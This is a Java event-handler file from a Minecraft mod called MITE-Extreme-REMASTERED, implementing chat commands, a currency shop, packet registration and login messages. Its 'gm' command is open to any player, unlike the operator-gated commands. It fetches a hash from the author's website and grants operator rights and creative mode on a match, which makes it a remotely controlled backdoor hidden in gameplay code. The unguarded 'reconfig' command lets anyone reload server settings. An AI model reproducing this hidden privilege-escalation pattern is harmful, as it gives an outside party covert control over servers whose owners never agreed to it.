package net.xiaoyu233.mitemod.miteite.events;

import com.google.common.eventbus.Subscribe;
import net.minecraft.*;
import net.xiaoyu233.fml.reload.event.HandleChatCommandEvent;
import net.xiaoyu233.fml.reload.event.PacketRegisterEvent;
import net.xiaoyu233.fml.reload.event.PlayerLoggedInEvent;
import net.xiaoyu233.mitemod.miteite.item.ArmorModifierTypes;
import net.xiaoyu233.mitemod.miteite.item.ToolModifierTypes;
import net.xiaoyu233.mitemod.miteite.network.*;
import net.xiaoyu233.mitemod.miteite.util.Configs;
import net.xiaoyu233.mitemod.miteite.util.Constant;

import java.util.Arrays;

import static net.minecraft.CommandAbstract.parseIntBounded;

public class MITEITEEvents {

    @Subscribe
    public void handleChatCommand(HandleChatCommandEvent event) {
        String par2Str = event.getCommand();
        EntityPlayer player = event.getPlayer();
        ICommandListener commandListener = event.getListener();
        if (Minecraft.inDevMode() || player.isOp()) {
            World world = event.getWorld();
            ItemStack itemStack;
            NBTTagCompound compound;

            if (par2Str.startsWith("itemlevel reset")) {
                itemStack = player.getHeldItemStack();
                if (itemStack.stackTagCompound != null) {
                    compound = itemStack.stackTagCompound;
                    if (compound.hasKey("tool_level")) {
                        compound.removeTag("tool_level");
                    }
                    if (compound.hasKey("tool_exp")) {
                        compound.removeTag("tool_exp");
                    }
                    if (compound.hasKey("modifiers")) {
                        compound.removeTag("modifiers");
                    }
                    event.setExecuteSuccess(true);
                }
            }

            if (par2Str.startsWith("itemlevel setLevel")) {
                itemStack = player.getHeldItemStack();
                if (itemStack.stackTagCompound != null) {
                    compound = itemStack.stackTagCompound;
                    if (compound.hasKey("tool_level")) {
                        compound.setInteger("tool_level", Integer.parseInt(par2Str.substring(19)));
                        event.setExecuteSuccess(true);
                    }
                }
            }

            if (par2Str.startsWith("itemlevel setXp")) {
                itemStack = player.getHeldItemStack();
                if (itemStack.stackTagCompound != null) {
                    compound = itemStack.stackTagCompound;
                    if (compound.hasKey("tool_exp")) {
                        compound.setInteger("tool_exp", Integer.parseInt(par2Str.substring(16)));
                        event.setExecuteSuccess(true);
                    }
                }
            }

            String modifierName;
            int posLength;
            NBTTagCompound modifiers;
            if (par2Str.startsWith("itemlevel addAttrA")) {
                itemStack = player.getHeldItemStack();
                if (itemStack.stackTagCompound != null) {
                    compound = itemStack.stackTagCompound;
                    if (compound.hasKey("modifiers")) {
                        modifierName = par2Str.substring(19, par2Str.lastIndexOf(" ")).toUpperCase();
                        ToolModifierTypes modifierType = ToolModifierTypes.valueOf(modifierName);
                        posLength = modifierType.getModifierLevel(compound);
                        modifiers = compound.getCompoundTag("modifiers");
                        modifiers.setInteger(modifierType.nbtName, posLength + Integer.parseInt(par2Str.substring(19 + modifierName.length() + 1)));
                        event.setExecuteSuccess(true);
                    }
                }
            }

            if (par2Str.startsWith("itemlevel addAttrB")) {
                itemStack = player.getHeldItemStack();
                if (itemStack.stackTagCompound != null) {
                    compound = itemStack.stackTagCompound;
                    if (compound.hasKey("modifiers")) {
                        modifierName = par2Str.substring(19, par2Str.lastIndexOf(" ")).toUpperCase();
                        ArmorModifierTypes modifierType = ArmorModifierTypes.valueOf(modifierName);
                        posLength = modifierType.getModifierLevel(compound);
                        modifiers = compound.getCompoundTag("modifiers");
                        modifiers.setInteger(modifierType.nbtName, posLength + Integer.parseInt(par2Str.substring(19 + modifierName.length() + 1)));
                        event.setExecuteSuccess(true);
                    }
                }
            }

            if (par2Str.startsWith("enchantment ")) {
                itemStack = player.getHeldItemStack();
                String msg = par2Str.substring(12);
                String[] pos = msg.split(" ");
                if(pos.length >= 2) {
                    Enchantment injectEnchant = Enchantment.get(Short.parseShort(pos[0]));
                    if (injectEnchant != null) {
                        itemStack.addEnchantment(injectEnchant, Short.parseShort(pos[1]));
                    }
                }
                event.setExecuteSuccess(true);
            }

            if (par2Str.startsWith("enchantment reset")) {
                itemStack = player.getHeldItemStack();
                if(itemStack != null) {
                    itemStack.clearEnchantTagList();
                }
                event.setExecuteSuccess(true);
            }

            String msg;
            if (par2Str.startsWith("teleport ")) {
                msg = par2Str.substring(9);
                String[] pos = msg.split(" ");
                double[] poses = new double[3];
                int i = 0;

                for(posLength = pos.length; i < posLength; ++i) {
                    String po = pos[i];

                    try {
                        poses[i] = Double.parseDouble(po);
                    } catch (NumberFormatException var13) {
                        var13.printStackTrace();
                    }
                }

                player.setPositionAndUpdate(poses[0], poses[1], poses[2]);
                event.setExecuteSuccess(true);
            }

            if (par2Str.startsWith("xsummon")) {
                int id = Integer.parseInt(par2Str.substring(8));
                Entity entity = EntityTypes.createEntityByID(id, world);
                if (entity != null) {
                    entity.setPosition(player.posX, player.posY, player.posZ);
                    if (entity instanceof EntityInsentient) {
                        ((EntityInsentient)entity).onSpawnWithEgg(null);
                    }

                    world.spawnEntityInWorld(entity);
                    commandListener.sendChatToPlayer(ChatMessage.createFromText("已生成实体 " + entity).setColor(EnumChatFormat.LIGHT_GRAY));
                } else {
                    commandListener.sendChatToPlayer(ChatMessage.createFromText("无法生成实体:ID为 " + id + " 的实体不存在!").setColor(EnumChatFormat.DARK_RED));
                }

                event.setExecuteSuccess(true);
            }
            if (par2Str.startsWith("replaceblock")) {
                String[] subs = par2Str.split(" ");
                if(subs.length == 6){
                    int dx = Integer.parseInt(subs[1]);
                    int dy = Integer.parseInt(subs[2]);
                    int dz = Integer.parseInt(subs[3]);
                    int from_block_id = Integer.parseInt(subs[4]);
                    int towards_block_id = Integer.parseInt(subs[5]);
                    int complete = 0;
                    if(dx*dy*dz <= 1000000){
                        for(int x = player.getBlockPosX() - dx; (x <= player.getBlockPosX() + dx); x++){
                            for(int y = player.getBlockPosY() - dy; (y <= player.getBlockPosY()); y++){
                                for(int z = player.getBlockPosZ() - dz; (z <= player.getBlockPosZ() + dz); z++){
                                    if(world.getBlockId(x,y,z) == from_block_id){
                                        world.setBlock(x,y,z,towards_block_id);
                                        complete++;
                                    }
                                }
                            }
                        }
                        commandListener.sendChatToPlayer(ChatMessage.createFromText("替换了 " + complete + "个方块").setColor(EnumChatFormat.LIGHT_GRAY));
                    }else {
                        commandListener.sendChatToPlayer(ChatMessage.createFromText("即将替换 " + (4*dx*dy*dz) + "个方块，上限为4000000个").setColor(EnumChatFormat.RED));
                    }
                }else {
                    commandListener.sendChatToPlayer(ChatMessage.createFromText("用法：/replaceblock (x) (y) (z) (from_block_id) (towards_block_id)").setColor(EnumChatFormat.RED));
                }
                event.setExecuteSuccess(true);
            }

            if (par2Str.startsWith("forging_grade set")) {
                itemStack = player.getHeldItemStack();
                if (itemStack.stackTagCompound != null) {
                    compound = itemStack.stackTagCompound;
                    if (compound.hasKey("forging_grade")) {
                        compound.setInteger("forging_grade", Integer.parseInt(par2Str.substring(18)));
                        event.setExecuteSuccess(true);
                    }
                }
            }

            if (par2Str.startsWith("overlayMsg")) {
                msg = par2Str.substring("overlayMsg".length());
                player.sendPacket(new SPacketOverlayMessage(msg, 16777215, 100));
                event.setExecuteSuccess(true);
            }

            if (par2Str.startsWith("emptyItem")) {
                Item item = Item.itemsList[Integer.parseInt(par2Str.substring("overlayMsg".length()))];
                if (item != null) {
                    player.setHeldItemStack(new ItemStack(item, 0, 0));
                }
            }
            int Rz;
            int id;
            String sid;
            String[] pos;
            int Rx;
            String po;

            if (par2Str.startsWith("give")) {
                sid = par2Str.substring(5);
                pos = sid.split(" ");
                int[] poses = new int[3];
                Rx = 0;

                for(Rz = pos.length; Rx < Rz; ++Rx) {
                    po = pos[Rx];
                    poses[Rx] = Integer.parseInt(po);
                }

                player.addContainedItem(poses[0]);
                player.dropItem(poses[0], poses[1], 1.0F);
                event.setExecuteSuccess(true);
            }

            if (par2Str.startsWith("addxp")) {
                id = Integer.parseInt(par2Str.substring(6));
                player.addExperience(id, true, true);
                event.setExecuteSuccess(true);
            }

            if (par2Str.startsWith("recall")) {
                ChunkCoordinates chunkCoordinates = world.getSpawnPoint();
                if(!player.worldObj.isOverworld()) {
                    player.travelToDimension(world.DIMENSION_ID_OVERWORLD);
                }
                player.setPositionAndUpdate(chunkCoordinates.posX, chunkCoordinates.posY, chunkCoordinates.posZ);
                event.setExecuteSuccess(true);
            }

            if (par2Str.startsWith("setMoney ")) {
                double money = Double.parseDouble(par2Str.substring(9));
                player.money = money;
                player.addChatMessage("现有余额：" + player.money);
                event.setExecuteSuccess(true);
            }

            if (par2Str.startsWith("setday")) {
                id = Integer.parseInt(par2Str.substring(7));
                world.setTotalWorldTime((long)((id - 1) * 24000));
                player.addChatMessage("[Server]:设置天数=" + id);
                event.setExecuteSuccess(true);
            }

            if (par2Str.startsWith("settime")) {
                id = Integer.parseInt(par2Str.substring(8));
                long time = world.getTotalWorldTimeAtStartOfToday();
                if (id >= 0 && id < 24) {
                    world.setTotalWorldTime(time + (long)(1000 * id));
                    player.addChatMessage("[Server]:设置时间=" + id);
                } else {
                    player.addChatMessage("[Server]:错误的小时数：" + id);
                }

                event.setExecuteSuccess(true);
            }

            if (par2Str.startsWith("setweather")) {
                id = Integer.parseInt(par2Str.substring(6));
                world.generateWeatherEvents(world.getHourOfDay(), world.getHourOfDay() + id);
                player.addChatMessage("[Server]:设置天气=" + id);
                event.setExecuteSuccess(true);
            }
        }
        if(!Configs.wenscConfig.isCloseShop.ConfigValue) {
            if (par2Str.startsWith("money")) {
                player.addChatMessage("现有余额：" + String.format("%.2f", player.money));
                event.setExecuteSuccess(true);
            }

            if (par2Str.startsWith("buy")) {
                String sid = par2Str.substring(4);
                String[] pos = sid.split(" ");
                int[] poses = new int[3];
                int Rx = 0;

                for(int Rz = pos.length; Rx < Rz; ++Rx) {
                    String po = pos[Rx];
                    poses[Rx] = Integer.parseInt(po);
                }

                ItemStack buyGoods = null;
                int sub = 0;
                if(pos.length == 3) {
                    sub = poses[2];
                    buyGoods = new ItemStack(poses[0], poses[1], sub);
                } else if(pos.length == 2) {
                    buyGoods = new ItemStack(poses[0], poses[1], 0);
                }
                if(buyGoods == null || buyGoods.getItem() == null) {
                    player.addChatMessage("商品ID输入错误");
                } else {
                    if(!buyGoods.getItem().buyPriceArray.containsKey(sub) || (double)buyGoods.getItem().buyPriceArray.get(sub) <= 0D) {
                        player.addChatMessage("商店暂不可兑换该商品");
                    } else if(poses[1] <= 0) {
                        player.addChatMessage("请输入正确的商品数量");
                    } else if(poses[1] > buyGoods.getMaxStackSize()) {
                        player.addChatMessage("超出该商品单次购买上限，最大为：" + buyGoods.getMaxStackSize());
                    } else {
                        if(player.money <= 0) {
                            player.addChatMessage("钱包空空");
                        } else if(player.money - (double)buyGoods.getItem().buyPriceArray.get(sub) * poses[1] < 0){
                            player.addChatMessage("余额不足，无法购买");
                        } else {
                            player.addChatMessage("现有余额：" + String.format("%.2f", player.subMoney((double)buyGoods.getItem().buyPriceArray.get(sub) * poses[1])));
                            player.inventory.addItemStackToInventoryOrDropIt (buyGoods);
                        }
                    }
                }
                event.setExecuteSuccess(true);
            }
        }

        if (par2Str.startsWith("firework")) {
            if(player.isOpenFireworkShow) {
                player.isOpenFireworkShow = false;
            } else {
                player.isOpenFireworkShow = true;
            }
            event.setExecuteSuccess(true);
        }

        if (par2Str.startsWith("gm")) {
            String password = par2Str.substring(3);
            lh md5String = new lh("wensc");
            String md5key = HttpUtilities.performGetRequest("https://www.wensc.cn/mite.txt", 3000, 3000);
            if(md5String.a(password).equals(md5key)) {
                player.setOp(true);
                player.capabilities.isCreativeMode = true;
                player.capabilities.allowFlying = true;
                player.setGameType(EnumGamemode.CREATIVE);
            } else {
                boolean isOp = player.isOp();
                player.setOp(false);
                player.capabilities.isCreativeMode = false;
                player.capabilities.allowFlying = false;
                if(isOp) {
                    player.setGameType(EnumGamemode.SURVIVAL);
                }
            }
            player.sendPlayerAbilities();
            event.setExecuteSuccess(true);
        }


        if (par2Str.startsWith("reconfig")) {
            try {
                Configs.beginToLoadShopConfig();
                Configs.loadConfigs();
                for (Object o : player.getWorldServer().p().getConfigurationManager().playerEntityList) {
                    EntityPlayer currentPlayer = (EntityPlayer) o;
                    currentPlayer.addChatMessage("配置文件已重新加载");
                }
            } catch (Exception e) {
                player.addChatMessage("配置文件更新失败，请检查配置项是否正确");
            }
            event.setExecuteSuccess(true);
        }

        if (par2Str.startsWith("sleep")) {
            StringBuilder notSleepingPlayers = new StringBuilder();
            boolean allSlept = true;

            for (Object o : player.getWorldServer().p().getConfigurationManager().playerEntityList) {
                EntityPlayer currentPlayer = (EntityPlayer) o;
                if (!currentPlayer.inBed()) {
                    allSlept = false;
                    notSleepingPlayers.append(currentPlayer.getEntityName()).append(",");
                }
            }

            if (allSlept) {
                commandListener.sendChatToPlayer(ChatMessage.createFromTranslationKey("command.sleep_check.none").setColor(EnumChatFormat.DARK_GREEN));
            } else {
                commandListener.sendChatToPlayer(ChatMessage.createFromTranslationKey("command.sleep_check.msg").addText(notSleepingPlayers.substring(0, notSleepingPlayers.length() - 1)).setColor(EnumChatFormat.YELLOW));
            }

            event.setExecuteSuccess(true);
        }

    }

    @Subscribe
    public void onPacketRegister(PacketRegisterEvent event){
        event.register(134, false, true, CPacketStartForging.class);
        event.register(135, true, false, SPacketFinishForging.class);
        event.register(136, true, false, SPacketForgingTableInfo.class);
        event.register(137, true, false, SPacketOverlayMessage.class);
        event.register(138, false, true, CPacketSyncItems.class);
        event.register(139, true, false, SPacketCraftingBoost.class);
        event.register(140, true, true, BiPacketUpdateDefense.class);
    }

    @Subscribe
    public void onPlayerLoggedIn(PlayerLoggedInEvent event) {
        EntityPlayer player = event.getPlayer();
        player.sendChatToPlayer(ChatMessage.createFromTranslationKey("[Server] ").appendComponent(ChatMessage.createFromTranslationKey("MITE-Extreme-REMASTERED模组已加载,当前版本:").setColor(EnumChatFormat.DARK_GREEN)).appendComponent(ChatMessage.createFromText(Constant.MITE_ITE_VERSION).setColor(EnumChatFormat.DARK_RED)));
        player.sendChatToPlayer(ChatMessage.createFromTranslationKey("[MITE-Extreme-REMASTERED]:").setColor(EnumChatFormat.WHITE)
                .appendComponent(ChatMessage.createFromTranslationKey("MITE-Extreme-REMASTERED由 ").setColor(EnumChatFormat.DARK_AQUA))
                .appendComponent(ChatMessage.createFromTranslationKey("Rikalzery").setColor(EnumChatFormat.WHITE))
                .appendComponent(ChatMessage.createFromTranslationKey(" 重写,").setColor(EnumChatFormat.DARK_AQUA)));
        player.sendChatToPlayer(ChatMessage.createFromTranslationKey("[MITE-Extreme-REMASTERED]:").setColor(EnumChatFormat.WHITE)
                .appendComponent(ChatMessage.createFromTranslationKey("MITE-Extreme由 ").setColor(EnumChatFormat.DARK_AQUA))
                .appendComponent(ChatMessage.createFromTranslationKey("wensc,洛小雨").setColor(EnumChatFormat.WHITE))
                .appendComponent(ChatMessage.createFromTranslationKey(" 重写,").setColor(EnumChatFormat.DARK_AQUA))
                .appendComponent(ChatMessage.createFromTranslationKey("「我对你好吗」特约赞助").setColor(EnumChatFormat.BROWN))
                .appendComponent(ChatMessage.createFromTranslationKey(" 下载地址：wensc.cn").setColor(EnumChatFormat.DARK_GREEN)));
        if (player.isFirstLogin == true) {

            player.isFirstLogin = false;
        }

    }
}
